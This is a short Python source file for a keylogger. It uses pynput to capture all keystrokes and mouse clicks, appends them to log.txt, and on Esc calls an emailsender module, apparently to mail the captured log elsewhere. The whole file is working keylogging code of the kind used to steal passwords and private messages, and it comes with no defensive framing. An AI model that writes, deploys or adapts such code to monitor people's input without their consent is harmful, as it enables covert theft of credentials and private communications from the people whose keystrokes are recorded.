#this main sction is they keylogger, reading in the info and spitting it 
#into a txt file


import pynput
from pynput import mouse

import emailsender



from pynput.keyboard import Key, Listener

count = 0
keys=[]
mouseflag=1

#def for writing to file, cleaning it up so it looks nice and clean
def write_file(keys):
    #open the file in append mode
    with open("log.txt", "a") as f:
        #for every key entered
        for key in keys:
            #replace the keys string key with an empty slot
            k2= str(key).replace("'","")
            #
            k=k2.replace('""',"'")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write(k)



#command for click
def on_click(pressed):
    global mouseflag
    if mouseflag==1:
        if pressed:
            print("mouse clicked")
            keys.append(" (mouse_click) ")
    else:
        return False



#commamand for on press                
def on_press(key):
    global keys, count
    keys.append(key)
    count+=1
    print("{0} pressed".format (key))

    #if the count is greater than 10 save to file
    if count >= 10:
        count=0
        write_file(keys)
        keys=[]


#check if program is getting ended
def on_release(key):
    global mouseflag
    #if the key is esc
    if key==Key.esc:
        #write what you have to the file
        write_file(keys)
        #send the mail
        emailsender.sendmail()
        mouseflag=0
        return False

#wipe the text file and start listening
with Listener(on_press=on_press, on_release =on_release) as listener:
    with mouse.Listener(on_click=on_click) as listener2:
        with open("log.txt", "w") as wipe:
            wipe.close()
        #two listeners one for keyboard one for mouse
        listener.join()
        listener2.join()
